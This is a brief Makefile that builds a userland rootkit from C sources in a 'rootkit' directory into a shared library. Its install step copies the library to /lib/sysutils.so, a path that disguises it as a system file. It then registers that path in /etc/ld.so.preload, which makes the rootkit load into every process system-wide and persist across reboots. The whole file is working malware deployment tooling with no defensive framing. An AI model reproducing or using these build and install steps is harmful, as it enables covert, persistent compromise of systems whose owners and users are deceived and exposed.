SRCS = $(wildcard rootkit/*.c)
HEADERS = $(wildcard rootkit/*.h)

dist/loader.so: $(SRCS) $(HEADERS)
	mkdir -p dist
	gcc -shared -fPIC $(SRCS) -o $@ -ldl -lconfig -nostartfiles

install:
	cp cerez.cfg /etc/cerez.cfg
	cp dist/loader.so /lib/sysutils.so 
	echo /lib/sysutils.so > /etc/ld.so.preload
